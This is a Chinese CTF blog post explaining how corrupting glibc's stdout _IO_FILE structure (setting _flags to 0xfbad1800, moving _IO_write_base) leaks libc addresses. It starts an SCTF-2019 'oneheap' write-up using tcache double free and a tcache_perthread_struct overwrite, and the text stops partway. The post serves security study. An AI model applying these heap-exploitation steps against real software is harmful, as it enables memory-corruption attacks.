---
layout: post
title:  "使用stdout泄露内存"
categories: pwn
tags: debug
excerpt: 使用stdout泄露内存
mathjax: true
---

* content
{:toc}

### Overview
在house of orange 之后，又一次利用_IO_FILE结构体，这次是用它泄露出libc地址。

### 0x00原理
这项技术是通过修改stdout的结构体中的指针,使其输出更多数据，泄露出libc地址。

1. 概念
stdout 是一个_IO_FILE结构体, 每个_IO_FILE结构体都有如下结构，在本文中最关注的是 _flags 和 _IO_write_base , _IO_write_ptr .
只要控制好这三个变量，就可以利用如puts / printf 等stdio相关的函数中泄露内存

```
struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
```
_IO_FILE_plus 就是_IO_FILE 外面多了一个vtable 里面有很多函数指针

```c
gdb-peda$ p *(struct _IO_FILE_plus *) stdout
$5 = {
  file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7ffff7dd26a4 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7dd18e0 <_IO_2_1_stdin_>,
    _fileno = 0x1,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "\n",
    _lock = 0x7ffff7dd3780 <_IO_stdfile_1_lock>,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd17a0 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}

gdb-peda$ p *((struct _IO_FILE_plus *) stdout).vtable
$6 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7ffff7a869c0 <_IO_new_file_finish>,
  __overflow = 0x7ffff7a87730 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7a874a0 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7a88600 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7a89980 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7a861e0 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7a85ec0 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7a854c0 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7a88a00 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7a85430 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7a85370 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7a7a180 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7a861a0 <__GI__IO_file_read>,
  __write = 0x7ffff7a85b70 <_IO_new_file_write>,
  __seek = 0x7ffff7a85970 <__GI__IO_file_seek>,
  __close = 0x7ffff7a85340 <__GI__IO_file_close>,
  __stat = 0x7ffff7a85b60 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7a89af0 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7a89b00 <_IO_default_imbue>
}

```
puts会将 _IO_write_base 和 _IO_write_ptr 区间内的数据输出,在输出之前_flags要满足一些要求
上面的 _flags = 0xfbad2887 是多个flag标志的集合,flag的定义在libio.h中,只例举我们用到的三个如下

```
#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_IS_APPENDING 0x1000
#define _IO_NO_WRITES 8 /* Writing not allowd */
```

2. puts程序流

_IO_puts => _IO_sputn => vtable 中的 __xsputn => _IO_new_file_xsputn => _IO_new_file_overflow

为了简化只写出需要设置flag的部分

```
int _IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) // 需要绕过
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) //需要绕过
    {
      ...
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  f->_IO_write_ptr - f->_IO_write_base);
```

_IO_do_write => new_do_write

```
static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)  /* 需要满足 */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
     ............
    }
  count = _IO_SYSWRITE (fp, data, to_do); // 最终目标
```

经过以上流程，我们需要设置_flags为 0xfbad1800
```
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

### 漏洞利用思路

1. 在没有tcache时： 使用unsorted bin attack 写一个main_arena 地址到一个fastbin 的fd中
2. 有tcache时 ： 
整体思路：通过修改libc中的stdout的结构，进行泄露

1. 同时修改_IO_IS_APPENDING(0x1000)和_IO_CURRENTLY_PUTTING(0x800)标志位.
2. 同时修改_IO_CURRENTLY_PUTTING(0x800)标志位和stdout->_IO_write_base和stdout->_IO_read_end
3. stdout已经输出过，所以_IO_CURRENTLY_PUTTING标志位就是1，我们只要修改stdout->_IO_write_base和stdout->_IO_read_end指针

### SCTF-2019-oneheap

1. 逆向分析：程序是堆题目，有tcache，功能上只有两个选项，保护全开,只有一个堆指针
* add: size小于0x7f
* free : free 后没有清空指针, 由于没有edit功能，这里就只能是double free(感谢tcache没有double free的check)，free次数限制4次
难点在于没有leak且free次数有限

2. 利用思路

* 首先可以确定通过覆盖stdout结构的方式进行泄露，需要一个main_arena 地址进行部分写申请到stdout ,但是在tcache的情况下需要free 7次填满tcache 后才能释放到unsorted bin 中获取到main_arena 地址,free 次数最多只有4次。
* 攻击tcache_perthread_struct 
tcache_perthread_struct 是管理tcache的结构，其中维护了已有的tcache chunk 地址
```
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
这个结构就放在堆的起始地址，基于double free 部分覆盖next指针指向tcache_perthread_struct 即可控制
修改tcache_perthread_struct 结构，中的count 让程序误认为已经有很多tcache ，因此下一次free 即可放到unsorted bin 中

* 

* double free + 部分覆盖

```
new(0x70,"a"*4)
de()
de()
```
gdb调试如下

```
│0x5587f864b000 PREV_INUSE {
│  mchunk_prev_size = 0x0,
│  mchunk_size = 0x251,
│  fd = 0x2000000000000,
│  bk = 0x0,
│  fd_nextsize = 0x0,
│  bk_nextsize = 0x0
│}
│0x5587f864b250 FASTBIN {
│  mchunk_prev_size = 0x0,
│  mchunk_size = 0x81,
│  fd = 0x5587f864b260,
│  bk = 0x0,
│  fd_nextsize = 0x0,
│  bk_nextsize = 0x0
│}


tcachebins
0x80 [  2]: 0x5587f864b260 ◂— 0x5587f864b260
```
可以看到同一个chunk两次被放到了tcachebin中,再通过new 将这个chunk fd修改为0x5587f864b000 ,即可控制tcache_perthread_struct

* 

* leak 地址


